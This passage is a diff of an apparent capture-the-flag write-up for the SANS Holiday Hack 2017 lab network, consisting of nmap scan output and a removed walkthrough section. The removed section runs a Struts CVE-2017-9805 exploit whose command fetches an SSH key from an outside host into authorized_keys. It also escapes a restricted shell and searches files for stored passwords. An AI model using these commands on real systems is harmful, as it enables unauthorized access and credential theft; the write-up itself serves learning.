+<span style="font-style: italic;">|_imap-capabilities: more AUTH=PLAIN capabilities have OK Pre-login AUTH=LOGINA0001 ENABLE listed SASL-IR IDLE post-login LITERAL+ IMAP4rev1 LOGIN-REFERRALS ID</span>
+<span style="font-style: italic;">2525/tcp open  ms-v-worlds</span>
+<span style="font-style: italic;">3000/tcp open  ppp</span>
+
+<span style="font-style: italic;">Nmap scan report for edb.northpolechristmastown.com (10.142.0.6)</span>
+<span style="font-style: italic;">Host is up (0.00014s latency).</span>
+<span style="font-style: italic;">Not shown: 996 closed ports</span>
+<span style="font-style: italic;">PORT     STATE    SERVICE</span>
+<span style="font-style: italic;">22/tcp   open     ssh</span>
+<span style="font-style: italic;">| ssh-hostkey:</span>
+<span style="font-style: italic;">|   2048 73:de:22:15:7b:53:13:85:a7:a5:8f:10:3a:5d:3b:3f (RSA)</span>
+<span style="font-style: italic;">|_  256 f5:d7:f3:5d:dc:7c:73:10:cc:f7:a4:c7:f0:d9:61:0c (ECDSA)</span>
+<span style="font-style: italic;">80/tcp   open     http</span>
+<span style="font-style: italic;">| http-robots.txt: 1 disallowed entry</span>
+<span style="font-style: italic;">|_/dev</span>
+<span style="font-style: italic;">| http-title: Site doesn'</span>t have a title (text/html; <span style="font-weight: bold; font-style: italic;">charset</span>=utf-8)<span style="font-weight: bold;">.</span>
+|_Requested resource was http://edb.northpolechristmastown.com/index.html
+389/tcp  filtered ldap
+8080/tcp open     http-proxy
+| http-robots.txt: 1 disallowed entry
+|_/dev
+|_http-title: Did not follow redirect to http://edb.northpolechristmastown.com/index.html
+
+Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)
+Host is up (0.00021s latency)<span style="font-weight: bold;">.</span>
+Not shown: 995 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-title: IIS Windows Server
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+| ssl-cert: Subject: <span style="font-weight: bold; font-style: italic;">commonName</span>=hhc17-smb-server
+| Not valid before: 2017-11-06T13:46:55
+|_Not valid after:  2018-05-08T13:46:55
+|_ssl-date: 2018-01-09T20:51:47+00:00; 0s from scanner time.
+
+Host script results:
+|_nbstat: NetBIOS name: HHC17-SMB-SERVE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 42:01:0a:8e:00:08 (unknown)
+| smb-security-mode:
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smbv2-enabled: Server supports SMBv2 protocol
+
+Nmap scan report for hhc17-apache-struts2.c.holidayhack2017.internal (10.142.0.11)
+Host is up (0.00021s latency)<span style="font-weight: bold;">.</span>
+Not shown: 997 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+| ssh-hostkey:
+|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
+|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
+80/tcp   open  http
+|_http-title: Toys List
+4444/tcp open  krb524
+
+Nmap scan report for eaas.northpolechristmastown.com (10.142.0.13)
+Host is up (0.00078s latency)<span style="font-weight: bold;">.</span>
+Not shown: 998 filtered ports
+PORT     STATE SERVICE
+80/tcp   open  http
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-title: Index - North Pole Engineering Presents: EaaS!
+3389/tcp open  ms-wbt-server
+| ssl-cert: Subject: <span style="font-weight: bold; font-style: italic;">commonName</span>=hhc17-elf-manufacturing
+| Not valid before: 2017-11-23T20:53:55
+|_Not valid after:  2018-05-25T20:53:55
+|_ssl-date: 2018-01-09T20:51:47+00:00; 0s from scanner time.
+
+Post-scan script results:
+| clock-skew:
+|   0s:
+|     10.142.0.13 (eaas.northpolechristmastown.com)
+|_    10.142.0.8 (hhc17-emi.c.holidayhack2017.internal)
+| ssh-hostkey: Possible duplicate hosts
+| Key 256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA) used by:
+|   10.142.0.2
+|   10.142.0.3
+|   10.142.0.11
+| Key 2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA) used by:
+|   10.142.0.2
+|   10.142.0.3
+|_  10.142.0.11
+Nmap done: 256 IP addresses (7 hosts up) scanned<span style="font-weight: bold;"> in</span> 14.86 seconds
+</pre>
+</div>
+</div>
 </div>
 </div>
 <div id="outline-container-sec-5-3" class="outline-3">
@@ -5117,385 +5528,10 @@ The text field for entering the SHA1 hashes of the great book pages appears to h
 </div>
 <div id="outline-container-sec-7" class="outline-2">
 <h2 id="sec-7"><span class="todo TODO">TODO</span> Misc</h2>
-<div class="outline-text-2" id="text-7">
-<p>
-Need to add this content elsewhere
-</p>
-</div>
-<div id="outline-container-sec-7-1" class="outline-3">
-<h3 id="sec-7-1">Let the Hack Begin!</h3>
-<div class="outline-text-3" id="text-7-1">
-</div><div id="outline-container-sec-7-1-1" class="outline-4">
-<h4 id="sec-7-1-1">Gaining Access to L2S</h4>
-<div class="outline-text-4" id="text-7-1-1">
-<p>
-The SAN cert showed it the was the same as dev.northpolechristmastown.com.
-</p>
-
-<p>
-TODO: Justin - how did you figure out it was Struts?
-</p>
-
-<p>
-Used the Python tool in the SANS blog post:
-</p>
-
-<div class="org-src-container">
-
-<pre class="src src-sh">python cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c <span style="font-style: italic;">'mkdir /home/alabaster_snowball/.ssh; cd /home/alabaster_snowball/.ssh; wget http://1.2.3.4/a.key -O authorized_keys; chmod 600 authorized_keys; chmod 700 .'</span>
-</pre>
-</div>
-</div>
-
-<ul class="org-ul"><li><a id="sec-7-1-1-1" name="sec-7-1-1-1"></a>Finding the password for alabaster_snowball<br  /><div class="outline-text-5" id="text-7-1-1-1">
-<p>
-Login using ssh, but explicitly run bash, bypassing the rbash restriction
-</p>
-
-<div class="org-src-container">
-
-<pre class="src src-sh">$ ssh alabaster_snowball@dev.northpolechristmastown.com -t bash
-</pre>
-</div>
-
-<p>
-First, fix the shells path.  We can grab what a normal path looks like from /etc/profile:
-</p>
-
-<div class="org-src-container">
-
-<pre class="src src-sh">alabaster_snowball@l2s:~$ grep PATH /etc/profile
-  <span style="font-weight: bold; font-style: italic;">PATH</span>=<span style="font-style: italic;">"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>
-  <span style="font-weight: bold; font-style: italic;">PATH</span>=<span style="font-style: italic;">"/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"</span>
-<span style="font-weight: bold;">export</span> PATH
-alabaster_snowball@l2s:~$ <span style="font-weight: bold; font-style: italic;">PATH</span>=<span style="font-style: italic;">"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>
-</pre>
-</div>
-
-<p>
-Find all small files owned by alabaster_snowball on the main filesystem and search them for the string password.
-Start small and double the filesize each time to keep the process fast.
-</p>
-
-<div class="org-src-container">
-
-<pre class="src src-sh">alabaster_snowball@l2s:~$ find / -xdev -type f -user alabaster_snowball -size -1k 2&gt;/dev/null |xargs grep passwor
-alabaster_snowball@l2s:~$ find / -xdev -type f -user alabaster_snowball -size -2k 2&gt;/dev/null |xargs grep passwor
-alabaster_snowball@l2s:~$ find / -xdev -type f -user alabaster_snowball -size -4k 2&gt;/dev/null |xargs grep passwor
-/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String password = <span style="font-style: italic;">"stream_unhappy_buy_loss"</span>;
-</pre>
-</div>
-
-<p>
-We could have also searched for the username to find intersting files:
-</p>
-
-<div class="org-src-container">
-
-<pre class="src src-sh">$ time grep alabaster_snowball -r /opt/
-/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String username = <span style="font-style: italic;">"alabaster_snowball"</span>;
-
-real       0m0.355s
-user       0m0.300s
-sys        0m0.052s
-</pre>
-</div>
-</div>
-</li></ul>
-</div>
-</div>
-
-<div id="outline-container-sec-7-2" class="outline-3">
-<h3 id="sec-7-2">Using ripgrep</h3>
-<div class="outline-text-3" id="text-7-2">
-<p>
-Ripgrep is a super fast grep replacement written in rust.
-It does a better job at filtering binary files, so we can run this command that finishes in about a second:
-</p>
-
-<div class="org-src-container">
-
-<pre class="src src-sh">$ mkdir /tmp/.rg
-$ cd /tmp/.rg
-$ wget https://github.com/BurntSushi/ripgrep/releases/download/0.7.1/ripgrep-0.7.1-x86_64-unknown-linux-musl.tar.gz
-$ tar xvzf ripgrep-0.7.1-x86_64-unknown-linux-musl.tar.gz
-$ find / -type f -xdev -user alabaster_snowball 2&gt;/dev/null | xargs ./ripgrep-0.7.1-x86_64-unknown-linux-musl/rg alabaster -A 1
-/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class
-3:            final String username = <span style="font-style: italic;">"alabaster_snowball"</span>;
-4-            final String password = <span style="font-style: italic;">"stream_unhappy_buy_loss"</span>;
-</pre>
-</div>
-
-<p>
-If we didn't think to only look in our files, it only takes 4 seconds to search
-the entire filesystem.  After ignoring proc and some debian package info, only
-a few lines are output.
-</p>
-
-<div class="org-src-container">
-
-<pre class="src src-sh">$ time ./ripgrep-0.7.1-x86_64-unknown-linux-musl/rg alabaster / --no-messages |grep -v /proc|grep -v deb.debian.org
-/etc/crontab:#@reboot root /usr/bin/nohup /usr/bin/sudo -u alabaster_snowball /opt/apache-tomcat/start_tomcat.sh &amp;
-/etc/subuid:alabaster_snowball:296608:65536
-/etc/passwd:alabaster_snowball:x:1003:1004:Alabaster Snowball,,,:/home/alabaster_snowball:/bin/rbash
-/etc/group:alabaster_snowball:x:1004:
-/etc/subgid:alabaster_snowball:296608:65536
-/etc/systemd/system/tomcat.service:<span style="font-weight: bold; font-style: italic;">User</span>=alabaster_snowball
-/etc/systemd/system/tomcat.service:<span style="font-weight: bold; font-style: italic;">Group</span>=alabaster_snowball
-/usr/share/dh-python/dist/cpython3_fallback:alabaster python3-alabaster
-/usr/share/dh-python/dist/cpython2_fallback:alabaster python-alabaster
-/usr/lib/google-cloud-sdk/platform/gsutil/third_party/pyasn1/doc/source/conf.py:# html_theme = <span style="font-style: italic;">'alabaster'</span>
-/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:            final String username = <span style="font-style: italic;">"alabaster_snowball"</span>;
-
-real       0m4.095s
-user       0m1.864s
-sys        0m18.808s
-</pre>
-</div>
-
-<p>
-Basic hostname enumeration:
-</p>
-
-<pre class="example">
-$ nmap -sL 10.142.0.*|fgrep '('
-Starting Nmap 7.40 ( https://nmap.org ) at 2017-12-18 02:20 UTC
-Nmap scan report for hhc17-l2s-proxy.c.holidayhack2017.internal (10.142.0.2)
-Nmap scan report for hhc17-apache-struts1.c.holidayhack2017.internal (10.142.0.3)
-Nmap scan report for mail.northpolechristmastown.com (10.142.0.5)
-Nmap scan report for edb.northpolechristmastown.com (10.142.0.6)
-Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
-Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)
-Nmap scan report for hhc17-apache-struts2.c.holidayhack2017.internal (10.142.0.11)
-Nmap scan report for eaas.northpolechristmastown.com (10.142.0.13)
-Nmap done: 256 IP addresses (0 hosts up) scanned in 0.01 seconds
-</pre>
-
-<p>
-Even without scanning any ports, we can guess what hhc17-smb-server does!
-</p>
-
-<div class="org-src-container">
-
-<pre class="src src-sh">ssh l2s | tee nmap.out
-</pre>
-</div>
-
-<pre class="example">
-Starting Nmap 7.40 ( https://nmap.org ) at 2017-12-15 02:26 UTC
-Nmap scan report for hhc17-l2s-proxy.c.holidayhack2017.internal (10.142.0.2)
-Host is up (0.00020s latency).
-Not shown: 996 closed ports
-PORT     STATE SERVICE  VERSION
-22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
-| ssh-hostkey: 
-|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
-|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
-80/tcp   open  http     nginx 1.10.3
-| http-methods: 
-|_  Supported Methods: GET HEAD POST OPTIONS
-|_http-server-header: nginx/1.10.3
-|_http-title: Did not follow redirect to https://hhc17-l2s-proxy.c.holidayhack2017.internal/
-443/tcp  open  ssl/http nginx 1.10.3
-| http-methods: 
-|_  Supported Methods: GET HEAD
-|_http-server-header: nginx/1.10.3
-|_http-title: Toys List
-| ssl-cert: Subject: commonName=dev.northpolechristmastown.com
-| Subject Alternative Name: DNS:dev.northpolechristmastown.com, DNS:l2s.northpolechristmastown.com
-| Issuer: commonName=Let's Encrypt Authority X3/organizationName=Let's Encrypt/countryName=US
-| Public Key type: rsa
-| Public Key bits: 2048
-| Signature Algorithm: sha256WithRSAEncryption
-| Not valid before: 2017-11-29T12:54:54
-| Not valid after:  2018-02-27T12:54:54
-| MD5:   90b5 5b73 6e21 e00f 0247 b22d a1ec f953
-|_SHA-1: c089 30bf cd61 3a55 ea8f f419 2542 b9b4 9823 8fb1
-|_ssl-date: TLS randomness does not represent time
-| tls-nextprotoneg: 
-|_  http/1.1
-2222/tcp open  ssh      OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
-| ssh-hostkey: 
-|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
-|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Nmap scan report for hhc17-apache-struts1.c.holidayhack2017.internal (10.142.0.3)
-Host is up (0.00017s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
-| ssh-hostkey: 
-|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
-|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
-80/tcp open  http    nginx 1.10.3
-| http-methods: 
-|_  Supported Methods: GET HEAD
-|_http-server-header: nginx/1.10.3
-|_http-title: Toys List
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Nmap scan report for mail.northpolechristmastown.com (10.142.0.5)
-Host is up (0.00021s latency).
-Not shown: 994 closed ports
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 53:ac:cc:7c:b1:cb:56:0b:bc:cd:05:12:36:e7:24:ca (RSA)
-|_  256 9f:4e:9a:ee:dc:ef:f4:4b:6d:1b:03:58:bb:5d:a2:87 (ECDSA)
-25/tcp   open  smtp    Postfix smtpd
-|_smtp-commands: mail.northpolechristmastown.com, PIPELINING, SIZE 10240000, ETRN, AUTH PLAIN LOGIN, AUTH=PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
-80/tcp   open  http    nginx 1.10.3 (Ubuntu)
-| http-methods: 
-|_  Supported Methods: GET HEAD POST OPTIONS
-| http-robots.txt: 1 disallowed entry 
-|_/cookie.txt
-|_http-server-header: nginx/1.10.3 (Ubuntu)
-|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
-143/tcp  open  imap    Dovecot imapd
-|_imap-capabilities: OK ID IDLE LITERAL+ AUTH=PLAIN more have capabilities listed post-login LOGIN-REFERRALS Pre-login AUTH=LOGINA0001 ENABLE SASL-IR IMAP4rev1
-2525/tcp open  smtp    Postfix smtpd
-|_smtp-commands: mail.northpolechristmastown.com, PIPELINING, SIZE 10240000, ETRN, AUTH PLAIN LOGIN, AUTH=PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
-3000/tcp open  http    Node.js Express framework
-| http-methods: 
-|_  Supported Methods: GET HEAD POST OPTIONS
-| http-robots.txt: 1 disallowed entry 
-|_/cookie.txt
-|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
-Service Info: Host:  mail.northpolechristmastown.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Nmap scan report for edb.northpolechristmastown.com (10.142.0.6)
-Host is up (0.00017s latency).
-Not shown: 996 closed ports
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
-| ssh-hostkey: 
-|   2048 33:fb:b7:35:b5:7a:72:6f:06:91:21:ff:e2:3e:86:79 (RSA)
-|_  256 70:71:ea:71:cd:83:d8:47:29:ef:6f:69:f3:8a:ed:a2 (ECDSA)
-80/tcp   open  http    nginx 1.10.3
-| http-methods: 
-|_  Supported Methods: HEAD OPTIONS GET
-| http-robots.txt: 1 disallowed entry 
-|_/dev
-|_http-server-header: nginx/1.10.3
-| http-title: Site doesn't have a title (text/html; charset=utf-8).
-|_Requested resource was http://edb.northpolechristmastown.com/index.html
-389/tcp  open  ldap
-| fingerprint-strings: 
-|   LDAPBindReq: 
-|     Version 2 not supported
-|   LDAPSearchReq: 
-|     supportedLDAPVersion1
-|     namingContexts1
-|     dc=com0/
-|     supportedExtension1
-|_    1.3.6.1.4.1.4203.1.11.10
-8080/tcp open  http    Werkzeug httpd 0.12.2 (Python 2.7.13)
-| http-methods: 
-|_  Supported Methods: HEAD OPTIONS GET
-| http-robots.txt: 1 disallowed entry 
-|_/dev
-|_http-server-header: Werkzeug/0.12.2 Python/2.7.13
-|_http-title: Did not follow redirect to http://edb.northpolechristmastown.com/index.html
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port389-TCP:V=7.40%I=7%D=12/15%Time=5A3332D9%P=x86_64-pc-linux-gnu%r(LD
-SF:APSearchReq,83,"0s\x02\x01\x07dn\x04\x000j0\x1b\x04\x14supportedLDAPVer
-SF:sion1\x03\x04\x0130\x1a\x04\x0enamingContexts1\x08\x04\x06dc=com0/\x04\
-SF:x12supportedExtension1\x19\x04\x171\.3\.6\.1\.4\.1\.4203\.1\.11\.10\x0c
-SF:\x02\x01\x07e\x07\n\x01\0\x04\0\x04\0")%r(LDAPBindReq,25,"0#\x02\x01\x0
-SF:1a\x1e\n\x01\x02\x04\0\x04\x17Version\x202\x20not\x20supported");
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)
-Host is up (0.00081s latency).
-Not shown: 998 filtered ports
-PORT     STATE SERVICE            VERSION
-80/tcp   open  http               Microsoft IIS httpd 10.0
-| http-methods: 
-|   Supported Methods: OPTIONS TRACE GET HEAD POST
-|_  Potentially risky methods: TRACE
-|_http-server-header: Microsoft-IIS/10.0
-|_http-title: IIS Windows Server
-3389/tcp open  ssl/ms-wbt-server?
-| ssl-cert: Subject: commonName=hhc17-smb-server
-| Issuer: commonName=hhc17-smb-server
-| Public Key type: rsa
-| Public Key bits: 2048
-| Signature Algorithm: sha256WithRSAEncryption
-| Not valid before: 2017-11-06T13:46:55
-| Not valid after:  2018-05-08T13:46:55
-| MD5:   092f 018a 083a b87a 8186 ecac da4e 09e2
-|_SHA-1: 0a0d f4e6 765f 1818 cd32 4bf2 5212 e8ca ef51 5c38
-|_ssl-date: 2017-12-15T02:27:40+00:00; 0s from scanner time.
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Nmap scan report for hhc17-apache-struts2.c.holidayhack2017.internal (10.142.0.11)
-Host is up (0.00014s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
-| ssh-hostkey: 
-|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
-|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
-80/tcp open  http    nginx 1.10.3
-| http-methods: 
-|_  Supported Methods: GET HEAD
-|_http-server-header: nginx/1.10.3
-|_http-title: Toys List
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Nmap scan report for eaas.northpolechristmastown.com (10.142.0.13)
-Host is up (0.00089s latency).
-Not shown: 998 filtered ports
-PORT     STATE SERVICE            VERSION
-80/tcp   open  http               Microsoft IIS httpd 10.0
-| http-methods: 
-|   Supported Methods: OPTIONS TRACE GET HEAD POST
-|_  Potentially risky methods: TRACE
-|_http-server-header: Microsoft-IIS/10.0
-|_http-title: Index - North Pole Engineering Presents: EaaS!
-3389/tcp open  ssl/ms-wbt-server?
-| ssl-cert: Subject: commonName=hhc17-elf-manufacturing
-| Issuer: commonName=hhc17-elf-manufacturing
-| Public Key type: rsa
-| Public Key bits: 2048
-| Signature Algorithm: sha256WithRSAEncryption
-| Not valid before: 2017-11-23T20:53:55
-| Not valid after:  2018-05-25T20:53:55
-| MD5:   a711 f240 0c9e a8cd 3be4 81fa fa16 f15a
-|_SHA-1: 5728 6c5d 2ec0 6657 629b f9f4 72aa 0b3d 12d4 b3a5
-|_ssl-date: 2017-12-15T02:27:40+00:00; 0s from scanner time.
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-
-NSE: Script Post-scanning.
-Initiating NSE at 02:27
-Completed NSE at 02:27, 0.00s elapsed
-Initiating NSE at 02:27
-Completed NSE at 02:27, 0.00s elapsed
-Post-scan script results:
-| clock-skew: 
-|   0s: 
-|     10.142.0.13 (eaas.northpolechristmastown.com)
-|_    10.142.0.8 (hhc17-emi.c.holidayhack2017.internal)
-| ssh-hostkey: Possible duplicate hosts
-| Key 2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA) used by:
-|   10.142.0.2
-|   10.142.0.3
-|   10.142.0.11
-| Key 256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA) used by:
-|   10.142.0.2
-|   10.142.0.3
-|_  10.142.0.11
-Read data files from: /usr/bin/../share/nmap
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 256 IP addresses (7 hosts up) scanned in 86.82 seconds
-</pre>
-</div>
-</div>
 </div>
 </div>
 <div id="postamble" class="status">
-<p class="author">Author: Vlad Grigorescu</p>
+<p class="author">Author: NCSA Security Team</p>
 <p class="creator"><a href="http://www.gnu.org/software/emacs/">Emacs</a> 25.3.1 (<a href="http://orgmode.org">Org</a> mode 8.2.10)</p>
 <p class="validation"><a href="http://validator.w3.org/check?uri=referer">Validate</a></p>
 </div>
